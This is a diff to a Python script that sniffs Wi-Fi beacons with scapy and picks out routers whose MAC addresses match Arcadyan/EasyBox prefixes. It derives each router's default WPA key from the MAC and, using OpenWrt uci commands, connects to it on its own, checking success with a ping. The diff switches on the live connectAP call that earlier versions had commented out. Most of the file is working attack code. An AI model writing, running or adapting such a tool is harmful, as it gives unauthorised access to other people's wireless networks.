@@ -8,14 +8,14 @@ import subprocess
 import os
 import logging
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
-import sqlite3 as lite
+#import sqlite3 as lite
 import time
 
 
 from subprocess import call
 from sys import argv          # Command-line arguments
 from sys import stdout, stdin # Flushing
-#from scapy.all import *
+from scapy.all import *
 
 ###########################
 #     VARS AND INIT       #
@@ -23,28 +23,32 @@ from sys import stdout, stdin # Flushing
 
 debug = 1
 version = 0.1
+os.system('uci set wireless.@wifi-iface[0].encryption=psk2')
 
 
 DN = open(os.devnull, 'w')
 ap_list = []
-ap_vuln = []
+ap_scan = []
  
 
 arcadyan_mac = ["00:12:BF","00:1A:2A", "00:1D:19","00:23:08", "00:26:4D","1C:C6:3C","50:7E:5D", "74:31:70","7C:4F:B5","88:25:2C"]
 
+
+subprocess.call(["ifconfig","wlan0","down"],stdout=DN,stderr=DN)
+subprocess.call(["ifconfig","wlan0","down"],stdout=DN,stderr=DN)
 ###########################
 #     DB CONNECTION       #
 ###########################
-try:
-    con = lite.connect('accesspoints.db')
-    
-    cur = con.cursor()    
-               
-    
-except lite.Error, e:
-    
-    print "Error %s:" % e.args[0]
-    sys.exit(1)
+#try:
+#    con = lite.connect('accesspoints.db')
+#    
+#    cur = con.cursor()    
+#               
+#    
+#except lite.Error, e:
+#    
+#    print "Error %s:" % e.args[0]
+#    sys.exit(1)
 
 
 ###########################
@@ -70,25 +74,29 @@ def disable_monitor_mode():
 def PacketHandler(pkt) :
 	if pkt.haslayer(Dot11) :
 		if pkt.type == 0 and pkt.subtype == 8 :
-			if pkt.addr2 not in ap_list :
-                                
+			if pkt.addr2 not in ap_scan :    
+				ap_scan.append(pkt.addr2)
 				ap_list.append(AP(pkt.info,pkt.addr2))
-				if debug: print "AP MAC: %s with SSID: %s " %(pkt.addr2, pkt.info)
+				print "AP MAC: %s with SSID: %s " %(pkt.addr2, pkt.info)
 
 
 def ping(host = "8.8.8.8"):
-    result = subprocess.call(["ping",host],stdout=DN,stderr=DN)
+    result = subprocess.call(["ping","-c","1",host],stdout=DN,stderr=DN)
     if result == 0:
         return 1
     else:
 	return 0
 
 def connectAP(ssid,key):
-	call(['uci set wireless.@wifi-iface[0].encryption=psk2'], stdout=DN, stderr=DN)
-	call(['uci set wireless.@wifi-iface[0].ssid='+ssid], stdout=DN, stderr=DN)
-	call(['uci set wireless.@wifi-iface[0].key='+key], stdout=DN, stderr=DN)
-	call(['uci commit wireless'])
-	call(['wifi'])
+	subprocess.call(["uci", "set", "wireless.@wifi-iface[0].ssid="+ssid],stdout=DN,stderr=DN)
+	subprocess.call(["uci", "set", "wireless.@wifi-iface[0].key="+key],stdout=DN,stderr=DN)
+	subprocess.call(["uci", "commit wireless"],stdout=DN,stderr=DN)
+	subprocess.call(["wifi"],stdout=DN,stderr=DN)
+	
+	#os.system('uci set wireless.@wifi-iface[0].ssid='+ssid)
+	#os.system('uci set wireless.@wifi-iface[0].key='+key)
+	#os.system('uci commit wireless')
+	#os.system('wifi')
 
 def easybox(mac):
         bytes = [int(x, 16) for x in mac.split(':')]
@@ -132,37 +140,32 @@ def getSQLVersion():
 ###########################
 
 
-ap_list.append(AP("00:12:BF","00:1A:2A:00:1A:2A"))
-
 print "Script version: %s" % version
-print "SQLite version: %s" % getSQLVersion()
+#print "SQLite version: %s" % getSQLVersion()
 
 
-#enable_monitor_mode('eth1')
-#sniff(iface="mon0", prn = PacketHandler)
+#enable_monitor_mode('wlan0')
+#time.sleep(4)
+
 
 print 'Scanning 10 seconds...'
-time.sleep(1)
+sniff(iface="mon0", prn = PacketHandler, timeout = 2)
+
 print('APs found: %d' %len(ap_list))
+
 for ap in ap_list:
         mac = ap.mac
         mac = mac[0:8]
         if mac in arcadyan_mac:
             print('Connecting to: %s with key: %s' % (ap.ssid,ap.getKey()))
-            #connectAP(ap.ssid,ap.getKey())
-            time.sleep(6)
+            connectAP(ap.ssid,ap.getKey())
+            time.sleep(4)
             if ping() == 1:
                 print 'Ping successful'
+                break
             else:
                 print 'No Ping'
-            
+            time.sleep(4)
 
-#printDB_AP()
-
-
-
-
-#print ping("www.google.dssdefe")
-
-
+print 'Done...'
 
